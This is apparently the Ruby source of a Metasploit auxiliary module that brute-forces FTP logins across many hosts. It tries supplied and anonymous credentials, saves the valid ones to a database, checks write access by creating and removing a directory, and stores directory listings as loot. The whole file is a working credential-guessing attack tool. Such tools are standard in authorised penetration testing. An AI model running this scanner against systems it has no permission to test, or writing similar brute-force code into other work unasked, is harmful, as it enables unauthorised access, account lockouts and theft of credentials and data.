##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ftp'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def proto
    'ftp'
  end

  def initialize
    super(
      'Name' => 'FTP Authentication Scanner',
      'Description' => %q{
        This module will test FTP logins on a range of machines and
        report successful logins. If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author' => [
          'todb',
          'g0tmi1k' # @g0tmi1k - additional features

      ],
      'References' => [
        [ 'CVE', '1999-0502' ], # Weak password
        [ 'ATT&CK', Mitre::Attack::Technique::T1021_REMOTE_SERVICES ],
        [ 'ATT&CK', Mitre::Attack::Technique::T1110_001_PASSWORD_GUESSING ]
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
        'Reliability' => []
      },
      'DefaultOptions' => {
        'ConnectTimeout' => 30
      }
    )

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(21),
        OptBool.new('ANONYMOUS_LOGIN', [ false, 'Attempt to login using various anonymous FTP users', false ]), # Overwrite the AuthBrute mixin, as its not sending blank/empty user/pass
        OptBool.new('CHECK_ACCESS', [ false, 'Check READ/WRITE access for successful logins', true ]),
        OptBool.new('STORE_LOOT', [false, 'Store the directory listing as loot', true])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false ]),
      ]
    )

    deregister_options('FTPUSER', 'FTPPASS') # Can use these, but should use 'username' and 'password'
  end

  def grab_report_banner
    vprint_status('Getting FTP banner')

    begin
      connect(true, false)
    rescue ::Rex::ConnectionRefused
      vprint_error('Connection refused')
      return
    rescue ::Rex::ConnectionError, ::IOError => e
      vprint_error(e.message)
      return
    ensure
      disconnect
    end

    unless banner
      vprint_warning('No FTP banner received')
      return
    end

    vprint_status("FTP Banner: #{banner_version}")
  end

  def ls_ftp_dir(username = 'anonymous')
    vprint_status('Listing directory contents')

    username = username.downcase

    listing = send_cmd_data(['LS'], nil)
    if listing.nil?
      print_warning('Could not retrieve directory listing (data connection failed)')
    elsif listing[1].nil? || listing[1].empty?
      vprint_status('Directory listing: (empty)')
    else
      vprint_status("Directory listing:\n#{listing[1]}")
      path = store_loot('ftp.dir_listing', 'text/plain', rhost, listing[1], "ftp_#{username}.txt", "FTP directory listing for #{username}")
      print_good("Directory listing stored to: #{path}")
    end
  end

  def run_host(ip)
    grab_report_banner

    print_status('Starting FTP login sweep')

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
      prepended_creds: anonymous_creds,
      anonymous_login: false # Otherwise this would send blank for both user/password, so its different to anonymous_creds()
    )

    if cred_collection.empty?
      print_error('No credentials specified. Set USERNAME/PASSWORD, USER_FILE/PASS_FILE, or ANONYMOUS_LOGIN.')
      return
    end

    scanner = Metasploit::Framework::LoginScanner::FTP.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        connection_timeout: datastore['ConnectTimeout'],
        ftp_timeout: datastore['FTPTimeout'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_data[:private_type] = :password
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core

        if datastore['CHECK_ACCESS'] || datastore['STORE_LOOT'] || datastore['FINGERPRINT']
          begin
            connect(true, false)
            send_user(result.credential.public)
            if send_pass(result.credential.private).to_s.start_with?('2')
              if datastore['CHECK_ACCESS']
                vprint_status('Checking read/write access')
                access_level = test_ftp_access
              end

              ls_ftp_dir(result.credential.public) if datastore['STORE_LOOT']

              fingerprint_server(result.credential.public) if datastore['FINGERPRINT']
            end
          rescue ::IOError, Errno::ECONNRESET, ::Timeout::Error => e
            vprint_error(e.message)
          ensure
            disconnect
          end
        end

        credential_data[:access_level] = access_level if access_level

        create_credential_login(credential_data)

        msg = "Success: #{result.credential}"
        msg << " (#{access_level})" if access_level
        print_good(msg)
      else
        invalidate_login(credential_data)

        proof = result.proof.to_s.strip
        proof_str = proof.empty? ? result.status.to_s : "#{result.status}: #{proof}"
        vprint_error("Login Failed: #{result.credential} (#{proof_str})")
      end
    end
  end

  # Check for anonymous access by pretending to be a browser
  def anonymous_creds
    return [] unless datastore['ANONYMOUS_LOGIN']

    ['mozilla@example.com', 'IEUser@', 'User@', 'chrome@example.com'].map do |password|
      Metasploit::Framework::Credential.new(public: 'anonymous', private: password, private_type: :password)
    end
  end

  def test_ftp_access
    dir = Rex::Text.rand_text_alpha(8)
    write_check = send_cmd(['MKD', dir], true)
    if write_check && write_check.start_with?('2')
      send_cmd(['RMD', dir], true)
      'Read/Write'
    else
      'Read-only'
    end
  end

end
